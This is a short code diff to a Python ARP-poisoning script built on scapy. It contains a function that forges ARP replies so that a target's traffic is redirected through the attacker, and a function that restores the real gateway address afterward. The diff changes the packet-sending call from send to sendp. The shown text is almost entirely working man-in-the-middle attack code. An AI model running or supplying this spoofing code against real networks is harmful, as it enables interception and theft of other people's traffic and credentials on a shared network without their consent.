@@ -17,7 +17,7 @@ def arp_poisoning(target_ip,poisoned_ip):
     target_mac = get_mac_address(target_ip)
 
     arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
-    scapy.send(arp_response,verbose=False)
+    scapy.sendp(arp_response,verbose=False)
     #scapy.ls(scapy.ARP())
 
 def reset_operation(fooled_ip,gateway_ip):
@@ -26,7 +26,7 @@ def reset_operation(fooled_ip,gateway_ip):
     gateway_mac = get_mac_address(gateway_ip)
 
     arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
-    scapy.send(arp_response,verbose=False,count=6)
+    scapy.sendp(arp_response,verbose=False,count=6)
 
 def get_user_input():
     parse_object = optparse.OptionParser()
